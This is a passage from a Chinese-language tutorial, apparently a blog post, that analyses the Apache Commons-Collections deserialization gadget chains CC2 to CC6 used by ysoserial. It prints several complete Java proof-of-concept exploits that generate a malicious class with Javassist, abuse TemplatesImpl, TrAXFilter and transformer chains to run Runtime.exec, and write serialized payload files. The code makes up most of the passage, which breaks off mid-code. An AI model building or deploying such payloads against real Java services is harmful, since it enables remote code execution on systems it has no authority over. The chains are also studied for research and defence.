siftUpComparable方法只是把元素放到队列里，并没有做什么事： 为什么还反射来构造函数来修改值？ 因为为了可以满足赋值，需要让comparator属性为null，才能继续走： 当我们再次反射，是为了可以在之后的readObject里面使用comparator属性来调用compare方法，我们需要给他赋值恶意chain。 流程梳理 payload：PriorityQueue（2，TransformingComparator(transformer = chain)） 对于PriorityQueue来说，他的comparator就是TransformingComparator(transformer = chain)这一串东西。 首先肯定是进入PriorityQueue的readObject方法，一路走。 之后重点在PriorityQueue的siftDown方法中，会校验comparator是否为null，显然不是，进入siftDownUsingComparator方法。 之后在siftDownUsingComparator进行了comparator.compare，下图显示 由于comparator是TransformingComparator类对象，所以进入TransformingComparator的compare方法 这时TransformingComparator对象的this.transformer属性就是chain，chain.transform成环调用，触发。 第一个transform就会触发。 TemplatesImpl版本ysoserial用的是这个版本 之前提到过，TransformingComparator的compare内部并不像ChainedTransformer的transform一样是成环transform。 ysoserial把目光聚焦在了TemplatesImpl里面 TemplatesImpl位于rt.jar下的sun包里面，源码分析： TemplatesImpl这个类有两个属性： _bytecodes：byte[] 字节码的字节数组 _class: Class[] 根据 _bytecode 生成的Class对象 可以看到： getTransletInstance defineTransletClasses 我们都知道静态代码块可以在类加载的同时执行，所以我们只要生成一个类，这个类的静态代码块里执行恶意命令。 所以这里我们就要找，哪里可以调用getTransletInstance方法， 发现在本类的newTransformer里面调用了getTransletInstance： 那哪里调用了newTransformer方法呢？发现在getoutputProperties里调用了： 这部分有点乱画个调用图： 所以到目前为止，我们的收获： PriorityQueue的readObject可以走到Comparator接口的compare方法 TransformingComparator是Comparator的实现类，TransformingComparator的transform方法会调用Tranformer接口的transform函数 另一方面，TransformerImpl的newTransformer的一系列操作可以将_bytecode数组里面的内容加载进虚拟机，获得一个AbstractTranslet类的对象 创建这个对象的时候，Class类对象里的静态代码块必将被执行 所以现在的问题就是，如何将一个实现了Tranformer接口的类，他的transform方法和TransformerImpl的newTransformer结合到一起。 纽带我们发现TransformingComparator的构造函数可以将Transformer类放入自身transformer类属性： 隐隐约约感觉能连上！ ysoserial的思路是将恶意操作放在一个类的静态代码块中，将这个类的bytecode传递给某个可控参数，最终传递给invoke函数命令执行。 开始构造PoC： 构造流程: 首先我们要有一个PriorityQueue对象pq在最外面，作为readObject的入口 javassist生成一个恶意类，它的静态代码块中有恶意命令，获得这个恶意类的字节数组 拿到之后如何传递到链中，我们的payload说到底是一个static代码块，最理想的情况就是它被newInstance了，那我们就要找哪些方法可以做到，等等，好像不需要再找了，因为前文提到的TemplatesImpl的_bytecode数组内容在TemplatesImpl的getTransletInstance方法中被defineClass了 那么，现在问题就来到哪些类可以调用getTransletInstance方法呢？发现正巧的是TemplatesImpl自己的newTransformer就可以调用 所以现在就来到哪里可以调用newTransformer方法，发现没有，但是我们降维武器反射，这里需要用InvokeTransformer[]来包装一下“newTransformer” 现在还需要一个TemplatesImpl对象tmpl来帮我们做纽带，并且将这个对象的bytecode属性设置为恶意类，还要保证属性name不为null tmpl现在的bytecode属性内容就是恶意类，所以调用tmpl的newTransformer方法就可以了！ 一些细节 为什么恶意类要继承AbstractTranslet？ 因为TemplatesImpl的defineTransletClasses方法中有个判断，如果当前恶意类的父类不是AbstractTranslet的话，_tranletIndecx的值就是初始值-1。但是对于我们，class[0]就是我们的恶意类的Class对象，后续的newInstance离不开它，所以我们当然希望_tranletIndex的值就是0。 为什么_tranletIndex的值一定要是0呢？？？因为我们可以看到在TemplatesImpl的getTransletInstance中： _transletIndex决定了_class数组的检索位置。 为什么_name和_class属性要为null？ 因为在getTransletClasses中，只有满足这两个方法，才能进入defineTransletClasses： 为什么要改size的值？ 因为在heapify()中： PriorityQueue的size属性默认是0，在这就会断掉。 为什么不能直接给PriorityQueue的queue属性去赋值？非要用反射？ queue的值其实会在compare中当作参数，所以一定要有值。 不能直接赋值是因为： 抛开queue属性是private transient Object[] queue; queue属性以及其长度都是初始化时候得到的 好的现在如果是queue.add()的话： 只改一个地方： (其实这里面只add一次tmpl也是可以的) 第一次是2，他会先进行一个自动装箱，变成new Integer(2)，因为PriorityQueue接受Obejct泛型。 第一次由于size是初始值0，所以只是老实的进入queue[0]，size变成1 第二次由于是i=size，目前size是1，会进入siftUp函数 然后进入siftUpUsingComparator： 这里多说几句，可以看到k，x两个参数1和tmpl parent是0，e=queue[1]也就是Integer(1) 接下来会进入comparator的compare方法； 来到第一个tranform： 仔细看的话可以看出来obj1是上面siftUpUsingComparator函数的第二个函数x也就是Tmpl，obj2是上面的e，就是第一次传进去的值2 这里就会提前触发调用链，利用失败。 多说一句，就算绕过这里，在第三行this.decorated.compare语句又会走向哪里？ 我们当前传进来的comparator采用的是第一个构造函数，只有一个InvokerTransformer[] 这里面第二个参数是什么？ 再点进去发现是包装类的compareTo方法： 那就没事了。 现在可以回答这个问题了，因为会提前触发利用链，并且value1和value2的分别是两次transform的值，如果类型相同，是会走到这里的。 第一个传进去的tmpl在哪里用到了？ 跟一遍，会发现在compare这里传进去了，给了transform： 细心的你会发现，PriorityQueue的queue这个属性是transient的，为什么还能序列化成功？ queue本身作为transient属性，讲道理是不能写入到序列化的二进制文件中的。 是因为在PriorityQueue的writeObject方法中： 他先拿到流，然后把queue的内容循环的写入到流中，这样就被保存了下来。 最终版本PoC12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public class TemplatesImpl_Exploit &#123; public static void main(String[] args) throws Exception &#123; //1.先创建恶意类 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass tempExploitClass = pool.makeClass(\"3xpl01t\"); //一定要设置父类，为了后续顺利 tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName())); //写入payload，生成字节数组 String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /Applications/Calculator.app\\\");\"; tempExploitClass.makeClassInitializer().insertBefore(cmd); byte[] exploitBytes = tempExploitClass.toBytecode(); //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件 TemplatesImpl tmpl = new TemplatesImpl(); //设置_bytecodes属性为exploitBytes Field bytecodes = TemplatesImpl.class.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]&#123;exploitBytes&#125;); //一定要设置_name不为空 Field _name = TemplatesImpl.class.getDeclaredField(\"_name\"); _name.setAccessible(true); _name.set(tmpl, \"0range\"); //_class为空 Field _class = TemplatesImpl.class.getDeclaredField(\"_class\"); _class.setAccessible(true); _class.set(tmpl, null); //3.开始做InvokerTransformer 命名为iInvokerTransformer，需要借助它内部的invoke方法调用newTransformer方法 //然后用TransformingComparator包装他，因为TransformingComparator的构造函数可以把iInvokerTransformer传递给自身transformer属性 InvokerTransformer iInvokerTransformer = new InvokerTransformer(\"newTransformer\", new Class[]&#123;&#125;, new Object[]&#123;&#125;); TransformingComparator iTransformingComparator = new TransformingComparator(iInvokerTransformer); //4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始 PriorityQueue pq = new PriorityQueue(2); Object[] queueArray = new Object[]&#123;tmpl, 2&#125;; //解封属性comparator, iTransformingComparator =&gt; _comparator Field _comparator = PriorityQueue.class.getDeclaredField(\"comparator\"); _comparator.setAccessible(true); _comparator.set(pq, iTransformingComparator); //解封属性queue，queueArray =&gt; _queue Field _queue = PriorityQueue.class.getDeclaredField(\"queue\"); _queue.setAccessible(true); _queue.set(pq, queueArray); //size修改为2 Field _size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); _size.setAccessible(true); _size.set(pq, 2); try &#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\") + \"/src/main/resources/Payload_cc2_TemplatesImpl.ser\"))); outputStream.writeObject(pq); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\") + \"/src/main/resources/Payload_cc2_TemplatesImpl.ser\"))); inputStream.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; cc3条件： commons-collections: 3.1～3.2.1 jdk7u21之前 cc3更像是cc1和cc2的缝合变体，借助了cc1的lazyMap+动态代理和cc2的newInstance。 利用链寻找如果我们先从后半段开始看，和cc2一样，我们的目标是执行TemplatesImpl的newTransformer方法来newInstance cc2中我们知道，newTransformer方法属于TemplatesImpl类，更是Templates接口的方法， 我们需要寻找哪里调用了Templates.newTransformer方法 搜索一圈发现TrAXFilter这个类比较合适： 跟进去看，发现构造函数依赖Templates接口的参数，会调用参数的newTransformer方法： 所以现在，我们需要构造这个参数templates 或者new 一个TrAXFilter类的实例也是可以的啊！ysoserial选择了后者 怎样可以new一个实例呢？ ysoserial找到了InstantiateTransformer，看看他的transform方法： 可以看到，这里面调用了input参数的调用方法，然后借助iParamTypes和iArgs实例化了一个对象出来。 我们还记得cc1中的Chain可以循环调用transform方法，我们让input是TrAXFilter类对象不就可以了么 所以这里还是得用到chain 有了chain，问题来到了哪里会调用chain的入口点呢也就是chain的第一个transform方法？ 记得cc1的LazyMap么？他的get方法会调用transform，如果这里是chain不就美滋滋了么 哪里可以调用lazyMap的get方法呢？ 或许你还记得cc1的InvocationHandler的invoke会调用get方法： 稳，现在就是怎么让memberValues参数是LazyMap类型呢？ 降维打击，动态代理 我认为这里的思路一定是ysoserial的师傅们看到了AnnotationInvocationHandler既然是InvocationHandler的子类才想到。 假设现在有一个AnnotationInvocationHandler的类H 我们都知道，H要是想执行invoke方法，一定是H作为handler参与了一个动态代理类的实现。 我们假设上一句话提到的“一个动态代理类”是p，p调用了任何方法，都会交付给H的invoke去做。 同时我们还发现AnnotationInvocationHandler的readObject方法 他可以对Map类型的属性memberValues执行entrySet方法 这里其实entrySet或者什么别的其实都不重要，重要的是发生了调用 所以这里如果this,memberValues是一个LazyMap的代理类，那么这个代理类的handler的invoke方法就必将会执行。 所以我们上文提到的p，作为代理类，完全可以代理LazyMap类，handler配置为H就可以了 那么现在就是确定了我们的payload最外面是AnnotationInvocationHandler类，起名h2，我们要把h2.memberValues配置为一个动态代理，这里可以起名为mapProxy。 mapProxy目标是为了存放在h2.memberValues里，为了invoke。 mapProxy的handler位置需要设置为h1，这个h1也是AnnotationInvocationHandler类，h1.memberValues需要设置为LazyMap，为了LazyMap.get。 所以正常走下来就是： 1h2.readObject() -&gt; h2.memberValues.xxx() -&gt; mapproxy.xxx() -&gt; h1.invoke() -&gt; h1.memberValues.get() -&gt; LazyMap.get() 成功续命。 调用链流程梳理正常进入AnnotationInvocationHandler的readObject方法，h2的memberValues属性就是mapProxy 这里由于mapProxy是动态代理，所以只要调用就会调用handler的invoke方法，mapProxy的handler就是h1 h1也是AnnotationInvocationHandler类，所以会进入本类AnnotationInvocationHandler的invoke方法： 由于h1的memberValues属性是传进去的lazymap，所以会调用LazyMap的get方法： factory是chain，会进入chain的transform，接下里就很熟悉了： 成环调用，chain中第一个是元素是new ConstantTransformer(TrAXFilter.class),所以看上面，第一个循环的object返回的就是TrAXFilter的类对象（get(key)参数被无情抛弃），重点是第二次，会进入InstantiateTransformer的transform方法： 这里面细说，input参数是第一次object对象也就是TrAXFilter.class类对象，iParamTypes属性就是外面构造好的Templates.class类对象，iArgs属性就是提前传进来的tmpl对象。 con方法是TrAXFilter类中，满足只有一个Templates接口参数的构造函数。 tmpl是TemplatesImpl类，会调用Templates接口的newInstance方法，参数是iArgs也就是tmpl。 所以这里会走到TrAXFilter类的构造函数： 导致触发！ 最终版本PoCPoC： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public class TrAXFilter_Exploit &#123; public static void main(String[] args) throws Exception&#123; //1.先创建恶意类 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass tempExploitClass = pool.makeClass(\"3xpl01t\"); //一定要设置父类，为了后续顺利 tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName())); //写入payload，生成字节数组 String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /Applications/Calculator.app\\\");\"; tempExploitClass.makeClassInitializer().insertBefore(cmd); byte[] exploitBytes = tempExploitClass.toBytecode(); //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件 TemplatesImpl tmpl = new TemplatesImpl(); //设置_bytecodes属性为exploitBytes Field bytecodes = TemplatesImpl.class.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]&#123;exploitBytes&#125;); //一定要设置_name不为空 Field _name = TemplatesImpl.class.getDeclaredField(\"_name\"); _name.setAccessible(true); _name.set(tmpl, \"0range\"); //_class为空 Field _class = TemplatesImpl.class.getDeclaredField(\"_class\"); _class.setAccessible(true); _class.set(tmpl, null); //3.构造chain，封装进LazyMap Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125; ) &#125;; ChainedTransformer chain = new ChainedTransformer(transformers); HashMap innermap = new HashMap(); LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,chain); //4. 拿到cons,先做一个h1，h1.memberValues = lazymap final Constructor cons = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); cons.setAccessible(true); InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target.class,lazymap); // 创建LazyMap的动态代理类实例 Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),h1); // 创建一个AnnotationInvocationHandler实例h2，并且把刚刚创建的代理赋值给h2.memberValues InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target.class, mapProxy); //payload序列化写入文件，模拟网络传输 ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc3_TrAXFilter.ser\"))); fout.writeObject(h2); //服务端读取文件，反序列化，模拟网络传输 ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc3_TrAXFilter.ser\"))); //服务端反序列化，触发漏洞 fin.readObject(); &#125;&#125; cc4环境： commons-collections4: 4.0 jdk7u21之前 cc4是cc2和cc3的杂交体 前半段用了cc2的PriorityQueue以及TransformingComparator，TransformingComparator本来应该调用InvokeTransformer的transform方法的，但是因为InvokeTransformer被ban掉了，所以这里ysoserial用了cc3的chain，里面用的是InstantiateTransformer，用了InstantiateTransformer就必须要进行类实例的构造，也就和cc3后面一样了，也用了TrAXFilter来包装TemplatesImpl。 利用链构造cc2里面的前半部分可以一直走到TransformingComparator的transform方法： 在cc2里面，这里面的this.transformer是InvokerTransformer，但是在cc4里，我们需要换成chain来包装InstantiateTransformer，也就离不开后续TrAXFilter的newInstance了。 最终版本PoC12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667public static void main(String[] args) throws Exception&#123; //1.先创建恶意类 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass tempExploitClass = pool.makeClass(\"3xpl01t\"); //一定要设置父类，为了后续顺利 tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName())); //写入payload，生成字节数组 String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /Applications/Calculator.app\\\");\"; tempExploitClass.makeClassInitializer().insertBefore(cmd); byte[] exploitBytes = tempExploitClass.toBytecode(); //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件 TemplatesImpl tmpl = new TemplatesImpl(); //设置_bytecodes属性为exploitBytes Field bytecodes = TemplatesImpl.class.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]&#123;exploitBytes&#125;); //一定要设置_name不为空 Field _name = TemplatesImpl.class.getDeclaredField(\"_name\"); _name.setAccessible(true); _name.set(tmpl, \"0range\"); //_class为空 Field _class = TemplatesImpl.class.getDeclaredField(\"_class\"); _class.setAccessible(true); _class.set(tmpl, null); //3.构造chain,包装成TransformingComparator里，构造成 Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125; ) &#125;; ChainedTransformer chain = new ChainedTransformer(transformers); TransformingComparator iTransComparator = new TransformingComparator(chain); //4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始 PriorityQueue pq = new PriorityQueue(2); Object[] queueArray = new Object[]&#123;tmpl, 2&#125;; //解封属性comparator, iTransformingComparator =&gt; _comparator Field _comparator = PriorityQueue.class.getDeclaredField(\"comparator\"); _comparator.setAccessible(true); _comparator.set(pq, iTransComparator); //解封属性queue，queueArray =&gt; _queue Field _queue = PriorityQueue.class.getDeclaredField(\"queue\"); _queue.setAccessible(true); _queue.set(pq, queueArray); //size修改为2 Field _size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); _size.setAccessible(true); _size.set(pq, 2); try &#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\") + \"/src/main/resources/Payload_cc4_PriorityQueue.ser\"))); outputStream.writeObject(pq); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\") + \"/src/main/resources/Payload_cc4_PriorityQueue.ser\"))); inputStream.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; 这里面在PriorityQueue处还可以有第二种写法： 123456789//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始PriorityQueue pq = new PriorityQueue(2);pq.add(1);pq.add(1);//解封属性comparator, iTransformingComparator =&gt; _comparatorField _comparator = PriorityQueue.class.getDeclaredField(\"comparator\");_comparator.setAccessible(true);_comparator.set(pq, iTransComparator); 第二种为什么只提前add了两下就可以了呢？ debug一下，看第一次add： size默认是0，所以这里属性queue[]已经赋值了第一个元素Integer(1)，size也被复制为1 第二次add： 进到siftUp看一下，我们没有给comparator赋值，所以会进入else分支： siftUpComparator会将元素重新排序： 两次add结束之后的状态： 接下来解封comparator属性，包我们构造好的TransformingComparator借助反射赋值给它: 最终属性： 话说回来，要是第一种，没有提前add两次赋值呢？ 简短来说，那就是size和parator都没有赋值，只能再麻烦用反射去给size和queue赋值。 cc5条件： commons-collections:3.1-3.2.1 jdk1.8 利用链寻找因为jdk在1.8之后对AnnotationInvocationHandler类做了限制，所以在jdk1.8版本就必须找出能替代AnnotationInvocationHandler的新的可以利用的类，所以TiedMapEntry和BadAttributeValueExpException就被挖掘了出来。 先看cc中的TiedMapEntry的源码： 这里的map属性显然是可控的。 如果是我们熟悉的LazyMap就好了，这样就可以调用LazyMap.get方法进而触发Transformer的transform函数，执行调用链。 哪里可以调用TiedMapEntry的getValue呢？ TiedMapEntry的toString方法就可以 那么有没有一个类可以在反序列化时触发 TiedMapEntry.toString() 呢？ BadAttributeValueExpException 这里可以看到valObj也是从val属性拿到的，我们只要构造的时候把val属性设置为TiedMapEntry即可。 val是private，所以这里还是得用反射去构造。 最终版本PoCver1 12345678910111213141516171819202122232425262728293031public class BadAttributeValueExpException_Exploit &#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers_exec = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\",null&#125;), new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"open /Applications/Calculator.app\"&#125;) &#125;; Transformer chain = new ChainedTransformer(transformers_exec); HashMap innerMap = new HashMap(); innerMap.put(\"value\",\"abcd\"); Map lazyMap = LazyMap.decorate(innerMap,chain); TiedMapEntry tmap = new TiedMapEntry(lazyMap, 123); BadAttributeValueExpException payload = new BadAttributeValueExpException(1); Field val = BadAttributeValueExpException.class.getDeclaredField(\"val\"); val.setAccessible(true); val.set(payload,tmap); //payload序列化写入文件，模拟网络传输 ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc5_BadAttributeValueExpException.ser\"))); fout.writeObject(payload); //服务端读取文件，反序列化，模拟网络传输 ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc5_BadAttributeValueExpException.ser\"))); //服务端反序列化，触发漏洞 fin.readObject(); &#125;&#125; 慢点，这里既然提到了chain，我们可以模仿cc3来用InstantiateTransformer参与chain的构造，还有TrAXFilter： ver2： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public class InstantiateTransformer_Exploit &#123; public static void main(String[] args) throws Exception &#123; //1.先创建恶意类 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass tempExploitClass = pool.makeClass(\"3xpl01t\"); //一定要设置父类，为了后续顺利 tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName())); //写入payload，生成字节数组 String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /Applications/Calculator.app\\\");\"; tempExploitClass.makeClassInitializer().insertBefore(cmd); byte[] exploitBytes = tempExploitClass.toBytecode(); //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件 TemplatesImpl tmpl = new TemplatesImpl(); //设置_bytecodes属性为exploitBytes Field bytecodes = TemplatesImpl.class.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]&#123;exploitBytes&#125;); //一定要设置_name不为空 Field _name = TemplatesImpl.class.getDeclaredField(\"_name\"); _name.setAccessible(true); _name.set(tmpl, \"0range\"); //_class为空 Field _class = TemplatesImpl.class.getDeclaredField(\"_class\"); _class.setAccessible(true); _class.set(tmpl, null); //3.构造chain，封装进LazyMap Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125; ) &#125;; ChainedTransformer chain = new ChainedTransformer(transformers); HashMap innermap = new HashMap(); LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,chain); TiedMapEntry tmap = new TiedMapEntry(lazymap, 123); BadAttributeValueExpException payload = new BadAttributeValueExpException(null); Field val = BadAttributeValueExpException.class.getDeclaredField(\"val\"); val.setAccessible(true); val.set(payload,tmap); //payload序列化写入文件，模拟网络传输 ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc5_InstantiateTransformer.ser\"))); fout.writeObject(payload); //服务端读取文件，反序列化，模拟网络传输 ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc5_InstantiateTransformer.ser\"))); //服务端反序列化，触发漏洞 fin.readObject(); &#125;&#125; 等一下，既然可以用TemplatesImpl，那么我们在cc2的TemplatesImpl版本中发现，TemplatesImpl的newTransformer会将自身的_bytecodes直接数组生成类对象，执行对象构造函数。 我们发现在TiedMapEntry的getValue中会将key参数传入，之后transform也会将key传递，所以这里我们还可以将tmpl传入TiedMapEntry的key属性，在最后也会被执行到。 ver3： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public class TemplatesImpl_Exploit &#123; public static void main(String[] args) throws Exception&#123; //1.先创建恶意类 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass tempExploitClass = pool.makeClass(\"3xpl01t\"); //一定要设置父类，为了后续顺利 tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName())); //写入payload，生成字节数组 String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /Applications/Calculator.app\\\");\"; tempExploitClass.makeClassInitializer().insertBefore(cmd); byte[] exploitBytes = tempExploitClass.toBytecode(); //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件 TemplatesImpl tmpl = new TemplatesImpl(); //设置_bytecodes属性为exploitBytes Field bytecodes = TemplatesImpl.class.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]&#123;exploitBytes&#125;); //一定要设置_name不为空 Field _name = TemplatesImpl.class.getDeclaredField(\"_name\"); _name.setAccessible(true); _name.set(tmpl, \"0range\"); //_class为空 Field _class = TemplatesImpl.class.getDeclaredField(\"_class\"); _class.setAccessible(true); _class.set(tmpl, null); //3.构造InvokerTransformer InvokerTransformer iInvokerTransformer = new InvokerTransformer(\"newTransformer\", new Class[]&#123;&#125;, new Object[]&#123;&#125;); //InvokerTransformer iInvokerTransformer = new InvokerTransformer(\"getOutputProperties\",new Class[]&#123;&#125;,new Object[]&#123;&#125;);也可以 HashMap innermap = new HashMap(); LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,iInvokerTransformer); TiedMapEntry tmap = new TiedMapEntry(lazymap, tmpl);//注意这里 BadAttributeValueExpException payload = new BadAttributeValueExpException(null); Field val = BadAttributeValueExpException.class.getDeclaredField(\"val\"); val.setAccessible(true); val.set(payload,tmap); //payload序列化写入文件，模拟网络传输 ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc5_TemplatesImpl.ser\"))); fout.writeObject(payload); //服务端读取文件，反序列化，模拟网络传输 ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc5_TemplatesImpl.ser\"))); //服务端反序列化，触发漏洞 fin.readObject(); &#125;&#125; cc6条件： commons-collections:3.1-3.2.1 jdk1.7&amp;1.8 利用链寻找CC5 用了 BadAttributeValueExpException 反序列化去触发 LazyMap.get()，除了 BadAttributeValueExpException 、AnnotationInvocationHandler 还有其他方法吗？ ysoserial告诉我们HashMap也可以！ 我们再看看TiedMapEntry的内部方法hashCode： 这里也调用了getValue！ 如何反序列化时触发 TiedMapEntry.hashCode() ? ysoserial发现了HashMap的readObject方法： 调用了k.hashCode。 所以很容易想当然地构造出来一版PoC： 但是你会发现，在put操作处就会触发payload了，根本不是在readObject里面。 跟进去看看，这里面直接就触发了利用链，所以我们希望利用链触发在readObejct的位置。 如果想在readObject位置触发，跟几步发现，需要在LazyMap的get方法中让下面这个判断成立，才能进入transform： 这里面的map就是LazyMap，key就是123 我们当然希望返回值是false 继续跟进LazyMap的containsKey： 希望getEntry(key)==null 继续跟进getEntry，这里面的key是123： 这里可以看到，先有一个key是否为null的判断，123不为null所以执行了hash(key) table是什么呢？ 当我们第一次： 12HashMap hashMap = new HashMap();hashMap.put(tmap, \"test\"); 虽然我们调用的是无参构造方法，但是这里会给我们安排到有参构造方法。 DEFAULT_INITIAL_CAPACITY = 16进入有参构造方法： 这个table属于最外面的hashMap，他的长度为16 继续跟进到TiedMapEntry的get方法： 这里面的map是LazyMap类的对象，也就是我们传进去的lazyMap 继续跟，来到LazyMap的get方法： 这里面的map是我们传进去的innermap，也就是hashmap类型 跟进去看， 这里可以看到，先有一个key是否为null的判断，123不为null所以执行了hash(key) 所以这里e为null，返回null。成功会在put触发。 但是不要忘了put之后的状态： lazymap.map就被放入了一个key，key的entry。 假如说这时候我们再通过HashMap的readObject方法来到LazyMap的get方法这里，当再次经过这次判断的时候，因为map里已经存放了entry&lt;“123”，“123”&gt;，那么就不再会是false，导致无法进入transform方法，利用链断掉。 所以我们需要把map的内容改掉： 两种方法都行： 12lazyMap.remove(123);lazyMap.clear( 我们可以改写一下，将lazyMap中hashmap的put之后的key去掉，这样就可以先执行，然后在反序列化时候再执行一遍： HashMap版PoC1234567891011121314151617181920212223242526272829303132public class HashMap_Exploit &#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers_exec = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\",null&#125;), new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"open /Applications/Calculator.app\"&#125;) &#125;; Transformer chain = new ChainedTransformer(transformers_exec); HashMap innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,chain); TiedMapEntry tmap = new TiedMapEntry(lazyMap, 123); HashMap hashMap = new HashMap(); hashMap.put(tmap, \"test\"); lazyMap.remove(\"123\"); //payload序列化写入文件，模拟网络传输 ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc6_HashMap.ser\"))); fout.writeObject(hashMap); //服务端读取文件，反序列化，模拟网络传输 ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc6_HashMap.ser\"))); //服务端反序列化，触发漏洞 fin.readObject(); &#125;&#125; fake chain版PoC既然现在来到了如何绕过put方法的提前执行，可以在构造LazyMap方法的时候穿进去一个空的chain，之后再利用反射将lazymap内部的_itransformer属性改回到真正的chain，这样就可以只最终的反序列化触发点。 1234567891011121314151617181920212223242526272829303132333435363738394041public class fackchain_Exploit &#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers_exec = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\",null&#125;), new 